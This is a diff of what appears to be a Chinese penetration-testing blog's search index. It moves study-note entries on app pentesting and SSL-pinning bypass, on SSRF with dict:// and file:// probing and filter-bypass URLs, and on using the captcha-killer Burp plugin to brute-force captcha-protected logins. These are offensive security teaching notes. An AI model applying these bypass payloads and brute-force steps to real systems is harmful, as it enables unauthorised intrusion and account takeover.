@@ -25,44 +25,6 @@
       </tags>
   </entry>
   <entry>
-    <title>App渗透</title>
-    <url>/2023/08/21/App%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<h1 id="什么是App渗透"><a href="#什么是App渗透" class="headerlink" title="什么是App渗透"></a>什么是App渗透</h1><p><strong>App渗透测试 和 Web渗透测试，基本没有区别</strong></p>
-<p>XSS SQL注入 文件上传 支付漏洞 验证码绕过 SSRF 等常见漏洞，App都有。</p>
-<p>app传输到目标得数据 =&gt; 走的还是HTTP，后端代码，开发逻辑是相同。</p>
-<p>Web =&gt; 用浏览器访问网站<br>App =&gt; 用app来访问目标<br>客户端 =&gt; 菜刀(exe)访问目标</p>
-<p><strong>最早的、最简单app其实就是内置浏览器封装</strong>(现在还能在线生成这种封装App)</p>
-<h1 id="用模拟器进行App渗透"><a href="#用模拟器进行App渗透" class="headerlink" title="用模拟器进行App渗透"></a>用模拟器进行App渗透</h1><p>安卓虚拟机 =&gt; 安卓模拟器<br>    夜神、雷电、UU、各种各样的<br>    雷电的高版本抓包有问题<br>        做app渗透测试最好用安卓7.0以下的模拟器<br>        对于用户的自安装的证书并不信任</p>
-<p>Web渗透的核心？ =&gt; 控制传参 GET POST<br>APP渗透的核心？ =&gt; 控制传参  抓包</p>
-<hr>
-<p>如何给模拟器抓包：<br>    设置代理<br>    der证书 模拟器装不了 （cer）</p>
-<p>​    139.159.239.31/gdqg/api/pubapi/index.php?table=shequ&amp;keyname=articletype&amp;keycontent=luntan</p>
-<p>​    —-</p>
-<p><strong>加密不要害怕：</strong><br>        1、网页端：分析JS代码。解决80%<br>        2、app: 加密在app的源码里。（比较麻烦了，逆向）</p>
-<p>​    未来的趋势：<br>​        1、Javascript / node.js npm<br>​        2、Java<br>​        3、Go 或者 Python (ChatGPT)</p>
-<p>​        </p>
-<hr>
-<p>常见的防抓包方法：<br>    有攻击必然有防御：<br>        防御：<br>            1、没有漏洞（不可能的事情）<br>            2、不让你抓包（很难测试）<br>            3、抓包了让你看不懂（加密传参）=&gt; App逆向和脱壳还有HOOK</p>
-<p>防抓包的方法的原理解析<br>    1、证书校验（其实就是https，我们用burp的证书就可以绕过）</p>
-<p>2、代理屏蔽（使用okhttp框架，里面可以设置无代理模式，不走系统代理）最常见<br>    不用系统代理，我们用VPN代理<br>3、单向认证，证书绑定（SSL pinning 单边校验）<br>4、双向认证（安卓并不是很常见）</p>
-<hr>
-<p>开源监控系统：sentry</p>
-<p>越权漏洞 =&gt; 注册两个账号来传这个参</p>
-<hr>
-<h3 id="单向认证："><a href="#单向认证：" class="headerlink" title="单向认证："></a>单向认证：</h3><p>​    app内置了一本证书。App会检测，通信的时候用的证书和我内置是否相同</p>
-<p>​    app -&gt; Burp -&gt; 目标<br>​       A证书     B证书</p>
-<p>​       1、逆向捞证书<br>​       2、Hook<br>​               代码执行到这里不往下执行了了就是断点。<br>​               app的代码里负责证书校验的代码，给他替换掉，永远返回真</p>
-<p>​           你得会安卓编程、逆向，能砸壳，看源码（App代码审计）<br>​               JustTrustMe 自动HOOK， 单向认证</p>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-        <category>App渗透</category>
-      </categories>
-      <tags>
-        <tag>App渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Access_偏移注入</title>
     <url>/2023/08/21/Access-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h1 id="偏移注入的使用时机"><a href="#偏移注入的使用时机" class="headerlink" title="偏移注入的使用时机"></a>偏移注入的使用时机</h1><p>在SQL注入的时候会遇到一些无法查询列名的问题，比如系统自带数据库的权限不够而无法访问系统自带库。<br>当你猜到表名无法猜到字段名的情况下，我们可以使用偏移注入来查询那张表里面的数据。</p>
@@ -107,6 +69,44 @@
       </categories>
       <tags>
         <tag>CSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>App渗透</title>
+    <url>/2023/08/21/App%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<h1 id="什么是App渗透"><a href="#什么是App渗透" class="headerlink" title="什么是App渗透"></a>什么是App渗透</h1><p><strong>App渗透测试 和 Web渗透测试，基本没有区别</strong></p>
+<p>XSS SQL注入 文件上传 支付漏洞 验证码绕过 SSRF 等常见漏洞，App都有。</p>
+<p>app传输到目标得数据 =&gt; 走的还是HTTP，后端代码，开发逻辑是相同。</p>
+<p>Web =&gt; 用浏览器访问网站<br>App =&gt; 用app来访问目标<br>客户端 =&gt; 菜刀(exe)访问目标</p>
+<p><strong>最早的、最简单app其实就是内置浏览器封装</strong>(现在还能在线生成这种封装App)</p>
+<h1 id="用模拟器进行App渗透"><a href="#用模拟器进行App渗透" class="headerlink" title="用模拟器进行App渗透"></a>用模拟器进行App渗透</h1><p>安卓虚拟机 =&gt; 安卓模拟器<br>    夜神、雷电、UU、各种各样的<br>    雷电的高版本抓包有问题<br>        做app渗透测试最好用安卓7.0以下的模拟器<br>        对于用户的自安装的证书并不信任</p>
+<p>Web渗透的核心？ =&gt; 控制传参 GET POST<br>APP渗透的核心？ =&gt; 控制传参  抓包</p>
+<hr>
+<p>如何给模拟器抓包：<br>    设置代理<br>    der证书 模拟器装不了 （cer）</p>
+<p>​    139.159.239.31/gdqg/api/pubapi/index.php?table=shequ&amp;keyname=articletype&amp;keycontent=luntan</p>
+<p>​    —-</p>
+<p><strong>加密不要害怕：</strong><br>        1、网页端：分析JS代码。解决80%<br>        2、app: 加密在app的源码里。（比较麻烦了，逆向）</p>
+<p>​    未来的趋势：<br>​        1、Javascript / node.js npm<br>​        2、Java<br>​        3、Go 或者 Python (ChatGPT)</p>
+<p>​        </p>
+<hr>
+<p>常见的防抓包方法：<br>    有攻击必然有防御：<br>        防御：<br>            1、没有漏洞（不可能的事情）<br>            2、不让你抓包（很难测试）<br>            3、抓包了让你看不懂（加密传参）=&gt; App逆向和脱壳还有HOOK</p>
+<p>防抓包的方法的原理解析<br>    1、证书校验（其实就是https，我们用burp的证书就可以绕过）</p>
+<p>2、代理屏蔽（使用okhttp框架，里面可以设置无代理模式，不走系统代理）最常见<br>    不用系统代理，我们用VPN代理<br>3、单向认证，证书绑定（SSL pinning 单边校验）<br>4、双向认证（安卓并不是很常见）</p>
+<hr>
+<p>开源监控系统：sentry</p>
+<p>越权漏洞 =&gt; 注册两个账号来传这个参</p>
+<hr>
+<h3 id="单向认证："><a href="#单向认证：" class="headerlink" title="单向认证："></a>单向认证：</h3><p>​    app内置了一本证书。App会检测，通信的时候用的证书和我内置是否相同</p>
+<p>​    app -&gt; Burp -&gt; 目标<br>​       A证书     B证书</p>
+<p>​       1、逆向捞证书<br>​       2、Hook<br>​               代码执行到这里不往下执行了了就是断点。<br>​               app的代码里负责证书校验的代码，给他替换掉，永远返回真</p>
+<p>​           你得会安卓编程、逆向，能砸壳，看源码（App代码审计）<br>​               JustTrustMe 自动HOOK， 单向认证</p>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+        <category>App渗透</category>
+      </categories>
+      <tags>
+        <tag>App渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -239,36 +239,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SSRF-服务器请求伪造攻击</title>
-    <url>/2023/08/21/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h1 id="SSRF定义"><a href="#SSRF定义" class="headerlink" title="SSRF定义"></a>SSRF定义</h1><p>服务器端请求伪造（SSRF）是指攻击者能够从易受攻击的Web应用程序发送精心设计的请求的对其他网站进行攻击。(利用一个可发起网络请求的服务当作跳板来攻击其他服务)<br>攻击者能够利用目标帮助攻击者访问其他想要攻击的目标,即A让B帮忙访问C</p>
-<p>典型的SSRF: 我们传参然后对方服务器去访问</p>
-<h2 id="与CSRF的区别"><a href="#与CSRF的区别" class="headerlink" title="与CSRF的区别"></a>与CSRF的区别</h2><p>CSRF(跨站/客户端请求伪造) =&gt; 浏览器因为Js偷偷的发送数据包</p>
-<p>SSRF(服务器端请求伪造) =&gt; 服务器因为你的传参偷偷发送数据包</p>
-<p>翻译网页 =&gt;<code>http://web.yeekit.com/</code> <code>http://fanyi.youdao.com</code><br>翻译单词 =&gt; POST/GET 传参去 数据库查询<br>翻译页面 =&gt; 翻译网站直接替代我们去访问那个目标站点，然后获得内容后查询英文对应，然后处理完返回给我们</p>
-<h1 id="SSRF的危害"><a href="#SSRF的危害" class="headerlink" title="SSRF的危害"></a>SSRF的危害</h1><p>1、[核心目的] 访问内网(外紧内松)  （要能访问内网,能访问本机）,即穿越防火墙的通行证<br>2、隐藏攻击者（当做跳板机来躲避追踪）<br>3、攻击目标本机（dict://可以探测端口   ;    file://协议可以读取文件,例如数据库的账户密码）<br>    （有些网站对127.0.0.1的访问是不设防的）<br>      WAF（不会拦截你的SSRF攻击）</p>
-<p>dict://协议的使用 : <code>XXXX.php?url=dict://127.0.0.1:80</code></p>
-<p>file://协议的使用 :  file:///F:/p_h_p/A_A_A/1.txt<br>                              <strong>要注意,如果例如.php文件显示不出来,可能是被浏览器和谐掉了,可以查看网页源码查看</strong></p>
-<p>SSRF还可以与存储型XSS联动做一个反射型XSS,例如靶场留言板弹cookie</p>
-<h1 id="如何判断是否存在SSRF"><a href="#如何判断是否存在SSRF" class="headerlink" title="如何判断是否存在SSRF"></a>如何判断是否存在SSRF</h1><p>在实战中,只要确定那个传参传进去的网站被对方服务器访问了就可能存在,所以可以利用DNSlog平台进行判定<code>dnslog.cn</code>   </p>
-<p>要注意, dnslog 只能针对有外网的服务器, 实战中不能忽视无外网的服务器, 可以进行内网ip的强扫</p>
-<p>项目上只要能发起请求就算漏洞(网站功能除外),但SRC需要可以访问内网和本机</p>
-<h1 id="域名-端口-与-内网ip-端口-的区别"><a href="#域名-端口-与-内网ip-端口-的区别" class="headerlink" title="域名:端口    与   内网ip:端口  的区别"></a><strong>域名:端口</strong>    与   <strong>内网ip:端口</strong>  的区别</h1><p><code>127.0.0.1:81</code> 当前存在SSRF漏洞的主机的81端口</p>
-<p> 域名:81  这个域名对应ip的81端口</p>
-<p>​    ip (公网ip) =&gt; 内网可能有10个主机</p>
-<h1 id="绕过SSRF防护的一些手法"><a href="#绕过SSRF防护的一些手法" class="headerlink" title="绕过SSRF防护的一些手法"></a>绕过SSRF防护的一些手法</h1><p>不能访问内网时,可以尝试以下操作</p>
-<p>1、<code>http://www.baidu.com@127.0.0.1</code><br>2、纯数字ip地址：<br>                    <code>http://www.baidu.com</code><br>                    <code>http://112.80.248.73</code><br>                    <code>http://1884354633</code><br>                    <code>http://0016024174111</code><br>                    <code>http://0x7050f849</code></p>
-<h1 id="扩展内容（不要求掌握-）"><a href="#扩展内容（不要求掌握-）" class="headerlink" title="扩展内容（不要求掌握 ）"></a>扩展内容（不要求掌握 ）</h1><h2 id="gopher协议：-可以发起TCP数据流"><a href="#gopher协议：-可以发起TCP数据流" class="headerlink" title="gopher协议： 可以发起TCP数据流"></a>gopher协议： 可以发起TCP数据流</h2><p>​    TCP: 有连接状态的东西<br>​    UDP: 漂流瓶联系（我就发送数据，不管你收到没）</p>
-<h2 id="redis未授权访问（SSRF攻击的东西）"><a href="#redis未授权访问（SSRF攻击的东西）" class="headerlink" title="redis未授权访问（SSRF攻击的东西）"></a>redis未授权访问（SSRF攻击的东西）</h2><p>​    redis 缓存数据库（默认没有密码 外网访问不到）</p>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>SSRF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Oracle_报错注入</title>
     <url>/2023/08/21/Oracle-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h1 id="Oracle-报错注入"><a href="#Oracle-报错注入" class="headerlink" title="Oracle 报错注入"></a>Oracle 报错注入</h1><p>oracle 甲骨文公司,使用免费的数据库但是服务收费 , 数据库语言大同小异 ,金融行业一般选择oracle</p>
@@ -334,59 +304,6 @@
       </tags>
   </entry>
   <entry>
-    <title>captcha插件介绍</title>
-    <url>/2023/08/21/captcha%E6%8F%92%E4%BB%B6%E4%BB%8B%E7%BB%8D/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>想必大家都会使用burp进行爆破,当遇到带验证码的登录表单进行爆破时,基本尝试抓包后观察验证码是否主动更新,或者进行验证码绕过,机缘巧合下我接触到了captcha-killer这个插件,可以提供给大家第三种爆破思路<strong>(我的插件和脚本打包放在<a href="https://bbs.zkaq.cn/t/30615/3.html" title="掌控安全社区">zkaq</a>的附件里了,插件也可以从GitHub下载)</strong><br>(<a href="https://github.com/c0ny1/captcha-killer">https://github.com/c0ny1/captcha-killer</a> “GitHub下载链接以及部分资料地址”)</p>
-<h2 id="什么是captcha-killer"><a href="#什么是captcha-killer" class="headerlink" title="什么是captcha-killer?"></a>什么是captcha-killer?</h2><p>总的来说,它是个用Java写的插件,可以无缝衔接于burp.但是他只是一个调用接口,并不进行识别的操作,真正进行验证码识别处理的是两个个用Python脚本(codereg.py)调用的两个接口(ddddocr和aiohttp), 稍后我会进行简明的介绍<br>captcha-killer设计理念是只专注做好对各种验证码识别技术接口的调用, 说具体点就是burp通过这一个插件，就可以适配各种验证码识别接口，无需重复编写调用代码.<br>今天不谈编码层面如何实现(主要是我也不会)，感兴趣的同学可以去github看源码. 此篇文章只通过使用步骤来说明使用方法</p>
-<h2 id="简要介绍codereg-py"><a href="#简要介绍codereg-py" class="headerlink" title="简要介绍codereg.py"></a>简要介绍codereg.py</h2><p>个人理解,这个脚本的整体识别流程是通过python在本地开启一个验证码识别的web接口来接收captcha-killer传来的验证码图片内容，然后调用识别服务(利用机器学习)来识别，最后返回结果给captcha-killer. </p>
-<hr>
-<hr>
-<h1 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h1><p><strong><em>ok废话不多说,这里是正题!!!!!!!!!!!!</em></strong></p>
-<h2 id="1-安装插件"><a href="#1-安装插件" class="headerlink" title="1.安装插件"></a>1.安装插件</h2><p>首先打开burp,选择Extender——&gt;Add（默认Java类型插件）————&gt;Select File——&gt;选择下载的captcha-killer-modified-jdk14.jar文件<br><img src="https://nc0.cdn.zkaq.cn/md/17628/965ea03bb3e0a551789e1810e45e7ac2_24004.png" alt=""></p>
-<p>发现任务栏里多出一个captcha-killer,就说明安装成功,如下图↓</p>
-<p><img src="https://nc0.cdn.zkaq.cn/md/17628/afe2e33d4bf109c274064e3193deb139_39339.png" alt=""></p>
-<hr>
-<hr>
-<h2 id="2-获取目标网站验证码"><a href="#2-获取目标网站验证码" class="headerlink" title="2.获取目标网站验证码"></a>2.获取目标网站验证码</h2><h3 id="1-找到要爆破的网站并打开burp-我找到了一个网站作为案例-并未进行爆破"><a href="#1-找到要爆破的网站并打开burp-我找到了一个网站作为案例-并未进行爆破" class="headerlink" title="(1)找到要爆破的网站并打开burp,我找到了一个网站作为案例(并未进行爆破)"></a>(1)找到要爆破的网站并打开burp,我找到了一个网站作为案例(并未进行爆破)</h3><p><img src="https://nc0.cdn.zkaq.cn/md/17628/a88df494a58751c3333052ed746c402a_61201.png" alt=""></p>
-<h3 id="2-开始抓包-点击验证码刷新-拦截此次请求"><a href="#2-开始抓包-点击验证码刷新-拦截此次请求" class="headerlink" title="(2)开始抓包,点击验证码刷新,拦截此次请求"></a>(2)开始抓包,点击验证码刷新,拦截此次请求</h3><p><img src="https://nc0.cdn.zkaq.cn/md/17628/b45d29a283bd138950dd5943964389a3_32909.png" alt=""></p>
-<h3 id="3-鼠标右键-将这个包发送到captcha-killer模组里"><a href="#3-鼠标右键-将这个包发送到captcha-killer模组里" class="headerlink" title="(3)鼠标右键,将这个包发送到captcha-killer模组里"></a>(3)鼠标右键,将这个包发送到captcha-killer模组里</h3><p>[‘extensions’—-&gt;’captcha-killer’—&gt;’send to captcha panel’]</p>
-<p><img src="https://nc0.cdn.zkaq.cn/md/17628/c28253542fb19f8fc1b7f511def8c7ad_75826.png" alt=""></p>
-<h3 id="4-点击任务栏里的插件模组-可以看到数据包已经自动填入-点击获取按钮-可以获取数据包内的图片验证码-此时获取验证码的流程已经走完-接下来的任务是进行识别"><a href="#4-点击任务栏里的插件模组-可以看到数据包已经自动填入-点击获取按钮-可以获取数据包内的图片验证码-此时获取验证码的流程已经走完-接下来的任务是进行识别" class="headerlink" title="(4)点击任务栏里的插件模组,可以看到数据包已经自动填入,点击获取按钮,可以获取数据包内的图片验证码,此时获取验证码的流程已经走完,接下来的任务是进行识别"></a>(4)点击任务栏里的插件模组,可以看到数据包已经自动填入,点击获取按钮,可以获取数据包内的图片验证码,此时获取验证码的流程已经走完,接下来的任务是进行识别</h3><p><img src="https://nc0.cdn.zkaq.cn/md/17628/449e70473ea282bd66f4443e32efd594_50672.png" alt=""></p>
-<h2 id="3-开启本地验证码识别服务"><a href="#3-开启本地验证码识别服务" class="headerlink" title="3.开启本地验证码识别服务"></a>3.开启本地验证码识别服务</h2><p>本文实验的python版本环境：Python 3.9.4</p>
-<h3 id="1-python中安装ddddocr和aiohttp包"><a href="#1-python中安装ddddocr和aiohttp包" class="headerlink" title="(1)python中安装ddddocr和aiohttp包"></a>(1)python中安装ddddocr和aiohttp包</h3><p>和其他第三方包的安装方式一样,在dos命令中写入以下命令</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install ddddocr aiohttp -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com </span><br></pre></td></tr></table></figure>
-<p>这样就是安装成功了<br><img src="https://nc0.cdn.zkaq.cn/md/17628/40a024b0479ea701d916652a3ee59b24_26796.png" alt=""></p>
-<h3 id="2-用python运行codereg-py脚本"><a href="#2-用python运行codereg-py脚本" class="headerlink" title="(2)用python运行codereg.py脚本"></a>(2)用python运行codereg.py脚本</h3><p>打开命令控制台(建议在当前文件夹下打开cmd,不用填路径也不用配环境变量)<br>运行以下脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python codereg.py</span><br></pre></td></tr></table></figure>
-<p><img src="https://nc0.cdn.zkaq.cn/md/17628/2628a5ee6290e8bc76736a3d325cfa92_39814.png" alt=""><br>显示ddddocr(本地验证码识别的web接口)已经运行成功,此时的接收端口为8888.<br>注意,这个dos面板不能关掉,否则ddddocr不会继续运行,也就不能进行识别了</p>
-<h3 id="3-在burp的captcha页面配置接口URL和请求模板（Request-template）"><a href="#3-在burp的captcha页面配置接口URL和请求模板（Request-template）" class="headerlink" title="(3)在burp的captcha页面配置接口URL和请求模板（Request template）"></a>(3)在burp的captcha页面配置接口URL和请求模板（Request template）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /reg HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8888</span><br><span class="line">Authorization:Basic f0ngauth</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8332</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>将以上代码直接复制进插件页面的左下角的请求模板中,填写url为<a href="http://127.0.0.1:8888">http://127.0.0.1:8888</a></p>
-<p><img src="https://nc0.cdn.zkaq.cn/md/17628/3519798e072ba9021b9e1615a331d48f_25444.png" alt=""></p>
-<p>点击识别之后通过ddddocr进行了机器学习的识别,可以看到dos面板开始进行了一系列操作</p>
-<p><img src="https://nc0.cdn.zkaq.cn/md/17628/dcd8e131cc1650b292b9679820a085b0_30657.png" alt=""></p>
-<p>此时可在右边的结果栏看到识别成功(这个第一张示例验证码比较复杂,所以识别失误了),但问题不大,识别简单的验证码成功率为百分之99.9%,复杂的验证码就别用这个插件了</p>
-<p>以上就是配置识别验证码的接口配置完成,接下来进行批量化处理的教学</p>
-<h2 id="4-最终步骤-将验证码识别与爆破结合"><a href="#4-最终步骤-将验证码识别与爆破结合" class="headerlink" title="4.最终步骤:将验证码识别与爆破结合"></a>4.最终步骤:将验证码识别与爆破结合</h2><h3 id="1-按正常步骤进行账号密码验证的抓包"><a href="#1-按正常步骤进行账号密码验证的抓包" class="headerlink" title="(1)按正常步骤进行账号密码验证的抓包"></a>(1)按正常步骤进行账号密码验证的抓包</h3><p>打开拦截开关,抓取登录操作的数据包<br><img src="https://nc0.cdn.zkaq.cn/md/17628/06317ffccd4ebc793631e28675eaca75_74377.png" alt=""></p>
-<h3 id="2-发送到intruder模块"><a href="#2-发送到intruder模块" class="headerlink" title="(2)发送到intruder模块"></a>(2)发送到intruder模块</h3><p>和正常的爆破一样,发送到入侵者模块</p>
-<p><img src="https://nc0.cdn.zkaq.cn/md/17628/93965be147ed7ec36e224d34931819bb_15926.png" alt=""></p>
-<h3 id="3-对密码和验证码添加攻击字段标记并选择pitchfork模式"><a href="#3-对密码和验证码添加攻击字段标记并选择pitchfork模式" class="headerlink" title="(3)对密码和验证码添加攻击字段标记并选择pitchfork模式"></a>(3)对密码和验证码添加攻击字段标记并选择pitchfork模式</h3><p><img src="https://nc0.cdn.zkaq.cn/md/17628/8e18cac2613c154a8bf7d9731edb0347_63977.png" alt=""></p>
-<h3 id="4-字段1对应密码-选择字典"><a href="#4-字段1对应密码-选择字典" class="headerlink" title="(4)字段1对应密码,选择字典"></a>(4)字段1对应密码,选择字典</h3><p>payload页面字段1选一个爆破密码的字典<br><img src="https://nc0.cdn.zkaq.cn/md/17628/95bfa4b337dc0106eb87512a3fc25c90_52878.png" alt=""></p>
-<h3 id="5-字段2对应captcha-killer模块"><a href="#5-字段2对应captcha-killer模块" class="headerlink" title="(5)字段2对应captcha-killer模块"></a>(5)字段2对应captcha-killer模块</h3><p>第二个payload是验证码的值<br>线程2选择继承插件模式<br>继承插件选择captcha-killer</p>
-<p><img src="https://nc0.cdn.zkaq.cn/md/17628/7571ffc4af2845b390a7bcbc21bbe18c_79835.png" alt=""></p>
-<p>(6)一定注意选择单线程<br>线程池为单线程，否则验证码识别会交叉出现错误,很好理解,因为页面的验证码会一次一换,如果不是一一对应的关系就会出现验证码错误.</p>
-<p><img src="https://nc0.cdn.zkaq.cn/md/17628/500576e3343d52241a4c0d37e23c06de_83467.png" alt=""></p>
-<h3 id="7-最终开始攻击-就会实现密码和验证码一一对应的爆破了"><a href="#7-最终开始攻击-就会实现密码和验证码一一对应的爆破了" class="headerlink" title="(7)最终开始攻击,就会实现密码和验证码一一对应的爆破了"></a>(7)最终开始攻击,就会实现密码和验证码一一对应的爆破了</h3><p><img src="https://nc0.cdn.zkaq.cn/md/17628/54c65794dfdd115e44193e0d66a6d070_45092.png" alt=""><br>↑此图为本机测试,并未进行未授权攻击</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>谢谢大家观看,这是我的第一篇文章,大家多多支持,欢迎投币哈哈!</p>
-]]></content>
-      <categories>
-        <category>渗透工具</category>
-      </categories>
-      <tags>
-        <tag>渗透工具</tag>
-        <tag>burp</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Xss-跨站脚本攻击</title>
     <url>/2023/08/21/Xss-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
     <content><![CDATA[<h1 id="1-Xss简介"><a href="#1-Xss简介" class="headerlink" title="1.Xss简介"></a>1.Xss简介</h1><h2 id="1-什么是xss"><a href="#1-什么是xss" class="headerlink" title="(1)什么是xss"></a>(1)什么是xss</h2><p>是一种前端代码的注入手法 =&gt; 用户输入的数据被当做<strong>前端代码</strong>执行</p>
@@ -447,6 +364,89 @@
       </categories>
       <tags>
         <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSRF-服务器请求伪造攻击</title>
+    <url>/2023/08/21/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h1 id="SSRF定义"><a href="#SSRF定义" class="headerlink" title="SSRF定义"></a>SSRF定义</h1><p>服务器端请求伪造（SSRF）是指攻击者能够从易受攻击的Web应用程序发送精心设计的请求的对其他网站进行攻击。(利用一个可发起网络请求的服务当作跳板来攻击其他服务)<br>攻击者能够利用目标帮助攻击者访问其他想要攻击的目标,即A让B帮忙访问C</p>
+<p>典型的SSRF: 我们传参然后对方服务器去访问</p>
+<h2 id="与CSRF的区别"><a href="#与CSRF的区别" class="headerlink" title="与CSRF的区别"></a>与CSRF的区别</h2><p>CSRF(跨站/客户端请求伪造) =&gt; 浏览器因为Js偷偷的发送数据包</p>
+<p>SSRF(服务器端请求伪造) =&gt; 服务器因为你的传参偷偷发送数据包</p>
+<p>翻译网页 =&gt;<code>http://web.yeekit.com/</code> <code>http://fanyi.youdao.com</code><br>翻译单词 =&gt; POST/GET 传参去 数据库查询<br>翻译页面 =&gt; 翻译网站直接替代我们去访问那个目标站点，然后获得内容后查询英文对应，然后处理完返回给我们</p>
+<h1 id="SSRF的危害"><a href="#SSRF的危害" class="headerlink" title="SSRF的危害"></a>SSRF的危害</h1><p>1、[核心目的] 访问内网(外紧内松)  （要能访问内网,能访问本机）,即穿越防火墙的通行证<br>2、隐藏攻击者（当做跳板机来躲避追踪）<br>3、攻击目标本机（dict://可以探测端口   ;    file://协议可以读取文件,例如数据库的账户密码）<br>    （有些网站对127.0.0.1的访问是不设防的）<br>      WAF（不会拦截你的SSRF攻击）</p>
+<p>dict://协议的使用 : <code>XXXX.php?url=dict://127.0.0.1:80</code></p>
+<p>file://协议的使用 :  file:///F:/p_h_p/A_A_A/1.txt<br>                              <strong>要注意,如果例如.php文件显示不出来,可能是被浏览器和谐掉了,可以查看网页源码查看</strong></p>
+<p>SSRF还可以与存储型XSS联动做一个反射型XSS,例如靶场留言板弹cookie</p>
+<h1 id="如何判断是否存在SSRF"><a href="#如何判断是否存在SSRF" class="headerlink" title="如何判断是否存在SSRF"></a>如何判断是否存在SSRF</h1><p>在实战中,只要确定那个传参传进去的网站被对方服务器访问了就可能存在,所以可以利用DNSlog平台进行判定<code>dnslog.cn</code>   </p>
+<p>要注意, dnslog 只能针对有外网的服务器, 实战中不能忽视无外网的服务器, 可以进行内网ip的强扫</p>
+<p>项目上只要能发起请求就算漏洞(网站功能除外),但SRC需要可以访问内网和本机</p>
+<h1 id="域名-端口-与-内网ip-端口-的区别"><a href="#域名-端口-与-内网ip-端口-的区别" class="headerlink" title="域名:端口    与   内网ip:端口  的区别"></a><strong>域名:端口</strong>    与   <strong>内网ip:端口</strong>  的区别</h1><p><code>127.0.0.1:81</code> 当前存在SSRF漏洞的主机的81端口</p>
+<p> 域名:81  这个域名对应ip的81端口</p>
+<p>​    ip (公网ip) =&gt; 内网可能有10个主机</p>
+<h1 id="绕过SSRF防护的一些手法"><a href="#绕过SSRF防护的一些手法" class="headerlink" title="绕过SSRF防护的一些手法"></a>绕过SSRF防护的一些手法</h1><p>不能访问内网时,可以尝试以下操作</p>
+<p>1、<code>http://www.baidu.com@127.0.0.1</code><br>2、纯数字ip地址：<br>                    <code>http://www.baidu.com</code><br>                    <code>http://112.80.248.73</code><br>                    <code>http://1884354633</code><br>                    <code>http://0016024174111</code><br>                    <code>http://0x7050f849</code></p>
+<h1 id="扩展内容（不要求掌握-）"><a href="#扩展内容（不要求掌握-）" class="headerlink" title="扩展内容（不要求掌握 ）"></a>扩展内容（不要求掌握 ）</h1><h2 id="gopher协议：-可以发起TCP数据流"><a href="#gopher协议：-可以发起TCP数据流" class="headerlink" title="gopher协议： 可以发起TCP数据流"></a>gopher协议： 可以发起TCP数据流</h2><p>​    TCP: 有连接状态的东西<br>​    UDP: 漂流瓶联系（我就发送数据，不管你收到没）</p>
+<h2 id="redis未授权访问（SSRF攻击的东西）"><a href="#redis未授权访问（SSRF攻击的东西）" class="headerlink" title="redis未授权访问（SSRF攻击的东西）"></a>redis未授权访问（SSRF攻击的东西）</h2><p>​    redis 缓存数据库（默认没有密码 外网访问不到）</p>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>captcha插件介绍</title>
+    <url>/2023/08/21/captcha%E6%8F%92%E4%BB%B6%E4%BB%8B%E7%BB%8D/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>想必大家都会使用burp进行爆破,当遇到带验证码的登录表单进行爆破时,基本尝试抓包后观察验证码是否主动更新,或者进行验证码绕过,机缘巧合下我接触到了captcha-killer这个插件,可以提供给大家第三种爆破思路<strong>(我的插件和脚本打包放在<a href="https://bbs.zkaq.cn/t/30615/3.html" title="掌控安全社区">zkaq</a>的附件里了,插件也可以从GitHub下载)</strong><br>(<a href="https://github.com/c0ny1/captcha-killer">https://github.com/c0ny1/captcha-killer</a> “GitHub下载链接以及部分资料地址”)</p>
